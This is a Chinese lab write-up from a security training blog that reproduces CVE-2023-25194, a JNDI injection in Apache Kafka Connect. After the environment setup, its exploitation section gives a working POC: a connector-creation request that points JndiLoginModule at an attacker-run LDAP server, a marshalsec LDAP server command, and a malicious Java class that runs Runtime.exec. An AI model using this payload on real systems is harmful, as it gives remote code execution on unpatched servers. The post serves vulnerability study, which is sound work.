# Apache Kafka JNDI 注入(CVE-2023-25194)漏洞复现浅析 - 合天网安实验室 - 博客园

> 原文：[`www.cnblogs.com/hetianlab/p/17247734.html`](https://www.cnblogs.com/hetianlab/p/17247734.html)

#### 关于

Apache Kafka 是一个开源的分布式事件流平台，被数千家公司用于高性能数据管道、流分析、数据集成和任务关键型应用程序。

#### 影响版本

> 2.4.0<=Apache kafka<=3.2.2

#### 环境搭建

满足影响版本的应该都可以，这里我是使用的版本为`2.5.0`

> wget [`archive.apache.org/dist/kafka/2.5.0/kafka_2.13-2.5.0.tgz`](https://archive.apache.org/dist/kafka/2.5.0/kafka_2.13-2.5.0.tgz)

直接解压

这里可以使用命令直接起起来，最新版的 kafka 是集成`Zookeeper`

> .\bin\windows\zookeeper-server-start.bat .\config\zookeeper.properties

但是报错了，可以自己安装 zookeeper

下载地址

> [`zookeeper.apache.org/releases.html`](http://zookeeper.apache.org/releases.html)

这里配置文件其实可以补钙，实际上日志记录功能可选择不要，直接启动

![image-20230314173916423](img/60b3070144fc8b942c1ce0eae484915b.png)

服务端正常启动。

![image-20230314144830477](img/06079fbf06bf3318eb56797958de0cd1.png)

只要不报错即为正常启动

继续修改 kafka 配置文件`server.properties`文件，修改日志存放路径

![image-20230314143848080](img/bda327b5f19ca13b785e7709bdd6bdef.png)

命令启动

```
.\bin\windows\kafka-server-start.bat .\config\server.properties
```

![image-20230314144757730](img/08e5eade8c1f496ed53d39e2b698ec81.png)

测试 kafa 搭建是否存在问题

*   创建主题

> .\bin\windows\kafka-topics.bat --create --bootstrap-server localhost:9092 --replication-factor 1 --partitions 1 --topic test111

![image-20230314145237700](img/e089dc55e824296744beda9dc88678ef.png)

*   查询主题

> .\bin\windows\kafka-topics.bat --list --bootstrap-server localhost:9092

![image-20230314145305409](img/b4ed0487a12e368e3c4700214299a3be.png)

*   创建生产者

> .\bin\windows\kafka-console-producer.bat --broker-list localhost:9092 --topic test111

![image-20230314145814595](img/f099619fc2b1805d167c7ef6c22874d4.png)

*   创建消费者

> .\bin\windows\kafka-console-consumer.bat --bootstrap-server localhost:9092 --topic test111 --from-beginning

![image-20230314145842932](img/75222c18bac993d6b742e08f3fbbc299.png)

消息收发没有问题，生产者输入信息之后消费者会自动消费。

【----帮助网安学习，以下所有学习资料免费领！加 vx：yj009991，备注 “博客园” 获取！】

　① 网安学习成长路径思维导图
　② 60+网安经典常用工具包
　③ 100+SRC 漏洞分析报告
　④ 150+网安攻防实战技术电子书
　⑤ 最权威 CISSP 认证考试指南+题库
　⑥ 超 1800 页 CTF 实战技巧手册
　⑦ 最新网安大厂面试题合集（含答案）
　⑧ APP 客户端安全检测指南（安卓+IOS）

启动 connect

> .\bin\windows\connect-standalone.bat .\config\connect-standalone.properties .\config\connect-file-source.properties .\config\connect-file-sink.properties

![image-20230314151016538](img/6398545123e3857834ed96f66968393e.png)

因为牵涉到**补图片**，图片内的时间顺序可能不对，请忽略

访问

> [`192.168.2.135:8083/connector-plugins`](http://192.168.2.135:8083/connector-plugins)

![image-20230314135217780](img/3600afe5df2300d3048b698ebe11ef3e.png)

这里是没有插件的，所以需要安装插件。这里要复现 CVE-2023-25194，需要使用**io.debezium.connector.mysql.MySqlConnector**类，所以需要配置 Debezium MySQL 连接器配置属性

安装 Debezium

> [`debezium.io/releases/2.1/`](https://debezium.io/releases/2.1/)

这里根据自己环境安装，比较友好的时不同的版本有介绍需要的 java 版本，因为我的 java 环境为 1.8+的，所以这里我选择的版本比较老

![image-20230314154723215](img/c73310322b75230ec0e7a5cdf1d1bc82.png)

在 kafka 的安装目录创建一个文件夹

![image-20230314151856351](img/416ea16624df3855b7435be9d7833cc1.png)

存放 debezium，修改 kafka 的配置文件

![image-20230314152021688](img/a81e31b3afba26391e49c738900e2b54.png)

插件注意指向 debezium 的存放路径,重新启动，获取到插件，这里需要必坑的位置

1.java 版本需要匹配 kafka 版本以及其他组件版本

2.配置文件需要修改,否则会报错。

![image-20230314154905544](img/afaf24e25efb2f555f618544b06a2be1.png)

kafka 在连接 Mysql 时 数据需要同步到 Elasticsearch

具体的文章可以参考

> [`my.oschina.net/u/4923278/blog/5007756`](https://my.oschina.net/u/4923278/blog/5007756)

安装 mysql

> [MySQL :: Download MySQL Installer](https://dev.mysql.com/downloads/installer/)

![image-20230314174109336](img/23c787802a935b89ff6d93200334302e.png)

需要避坑的位置

![image-20230314174125857](img/fd87514a24870a09eae93bf5d19a125b.png)

结束

![image-20230314174137576](img/b93771e617385beaaf6aa4bb72dc341a.png)

登录 mysql 数据库，设置允许外部连接

```
GRANT ALL ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;
GRANT ALL ON *.* TO ''@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;
```

![image-20230314174151011](img/0a798415c746fb4c57f56f5703b31e3d.png)

*   set time_zone='+8:00';

*   show variables like '%time_zone%';

![image-20230314174203845](img/4b709cf325c510695c0aa9a58c002737.png)

mysql 需要开启配置

```
log_bin           = mysql-bin
binlog_format     = ROW
binlog_row_image  = FULL
expire_logs_days  = 10
```

可参考

> [`blog.csdn.net/wang972779876/article/details/120002546`](https://blog.csdn.net/wang972779876/article/details/120002546)

![image-20230314174221539](img/cbaf6a3b30fdeb1b53a58604098fbbd5.png)

访问路径

[`192.168.2.135:8083/connector-plugins`](http://192.168.2.135:8083/connector-plugins)

发现插件正常启动，参考的有复现的文章，说的时需要做时钟同步，但是在测试的时候发现其实时钟未做设置的时候也没有问题。

![image-20230314150030168](img/51b899d209dff5767035fca9e03e0612.png)

#### 漏洞利用

ＰＯＣ如下：

```
POST /connectors HTTP/1.1
Host: 192.168.2.135:8083
Content-Type: application/json
Content-Length: 809
​
{
    "name": "mysql-connect",
    "config": {
        "connector.class": "io.debezium.connector.mysql.MySqlConnector",
        "database.hostname": "192.168.2.135",
        "database.port": "3306",
        "database.user": "root",
        "database.password": "root",
        "database.server.id": "316545017",
        "database.server.name": "test1",
        "database.history.kafka.bootstrap.servers": "192.168.2.135:9092",
        "database.history.kafka.topic": "quickstart-events",    "database.history.producer.security.protocol": "SASL_SSL",
        "database.history.producer.sasl.mechanism": "PLAIN",
        "database.history.producer.sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://192.168.2.149:1389/rce\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
    }
}
```

具体的参数的配置属性可以参考这篇文章

> [`blog.csdn.net/weixin_43564627/article/details/118959829`](https://blog.csdn.net/weixin_43564627/article/details/118959829)

在利用的时候需要注意在使用`name`时，为`连接器的名称`，重复注册则会返回报错。

![image-20230314165531117](img/cdd33ced396d4b398eb1252112631c96.png)

使用`marshalsec-0.0.3-SNAPSHOT-all.jar`起 ldap 服务

> java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer [`192.168.2.135:8888/#Calc`](http://192.168.2.135:8888/#Calc) 1389

![image-20230314165109633](img/d79cf6dbf4a995b2731445d31cb3b23e.png)

发送 POC

![image-20230314165149937](img/94afc480c6004e2341d8e4f350f095aa.png)

可以看到请求了恶意类

恶意类内容 calc.java

```
import java.lang.Runtime;
​
public class Calc {
    public Calc() throws Exception{
        Runtime.getRuntime().exec("C:\Windwos\System32\cmd.exe ipconfg>C:\Users\Administrator\Desktop\2.txt");
    }
}
```

编译 java

> javac calc.java

在 8888 端口起 http 服务

> python -m http.server 8888

![image-20230314165411986](img/3f8c0896cceb9439e3591d5e082840ff.png)

执行 payload

![image-20230314163620306](img/baaaeae0709d6c2bbe4eb0a14a599459.png)

#### 漏洞原理

Apache Kafka Connect 是 Kafka 中用于和其他数据系统传输数据的服务，其独立运行版本可以在 Kafka 发布包中通过 `bin/connect-standalone.sh` 启动，默认会在 8083 端口开启 HTTP REST API 服务，可对连接器（Connector）的配置进行操作。

将连接器中的 Kafka 客户端 `sasl.jaas.config` 属性值设置为 com.sun.security.auth.module.JndiLoginModule（通过 `producer.override.sasl.jaas.config`, `consumer.override.sasl.jaas.config` 或 `admin.override.sasl.jaas.config` 属性进行配置）时，如果连接器连接到攻击者可控的 LDAP 服务器时容易受到反序列化攻击。

**更多靶场实验练习、网安学习资料，[请点击这里>>](https://www.hetianlab.com/)**